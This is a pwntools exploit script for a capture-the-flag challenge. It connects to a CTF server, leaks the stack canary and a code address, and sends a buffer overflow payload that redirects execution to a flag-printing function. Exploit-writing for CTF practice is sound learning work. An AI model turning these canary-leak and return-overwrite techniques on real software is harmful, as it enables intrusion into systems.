#!/usr/env/python3
from pwn import * 

context(os='linux', arch='arm64')
# context.log_level = 'debug'

def change_endian(original):
    changed = ''
    for i in range(0, len(original), 2):
        changed = (original[i:i+2]) + changed
    return changed

def leak_cannary(conn, addr_here):
    addr_cannary = hex(addr_here + 0x18)
    conn.sendline(change_endian(addr_cannary[2:]).encode('utf-8'))
    # skip "\nHere are the contents of 0x7fff4d0d4208:\n"
    conn.recvline()
    conn.recvline()
    return int(change_endian(conn.recvline().decode('utf-8')[0:-1]), 16) # remove last character "\n"

def leak_main(conn, addr_here):
    addr_main = hex(addr_here + 0x28)
    conn.sendline(change_endian(addr_main[2:]).encode('utf-8'))
    # skip "\nHere are the contents of 0x7fff4d0d4208:\n"
    conn.recvline()
    conn.recvline()
    return int(change_endian(conn.recvline().decode('utf-8')[0:-1]), 16) # remove last character "\n"

def main():
    conn = remote('pwn.bbctf.fluxus.co.in', 4002)
    conn.recvuntil(b'here: ')

    # get here address($rbp-0x20)
    addr_here = int(conn.recv(14).decode('utf-8'), 16)
    print("[+] recieve base:    {}".format(hex(addr_here)))

    # leak cannry
    conn.recvuntil(b'8 leaked bytes:')
    cannary = leak_cannary(conn, addr_here)
    print("[+] found cannry: {}".format(hex(cannary)))

    # leak addr of this_function_litterary_prints_the_flag
    conn.recvuntil(b'8 leaked bytes:')
    addr_main = leak_main(conn, addr_here) - 0x1a
    print("[+] found main addr: {}".format(hex(addr_main)))

    # addr_flag = addr_main - 0x110
    addr_flag = addr_main - 0x110
    print("[+] found flag addr: {}".format(hex(addr_flag)))

    # bof
    print("[+] BoF!!!!")
    conn.recvuntil(b'8 leaked bytes:')
    print(hex(addr_here + 0x28))
    exploit  = p64(addr_here + 0x28)
    exploit += b'\x00' * 0x8
    exploit += b'A' * 0x8
    exploit += p64(cannary)
    exploit += p64(0xdeadbeef)
    exploit += p64(addr_flag)
    conn.sendline(exploit)
    print(conn.recvline())
    print(conn.recvline())
    print(conn.recvline())
    print(conn.recvline())
    print(conn.recvline())

if __name__ == '__main__':
    main()
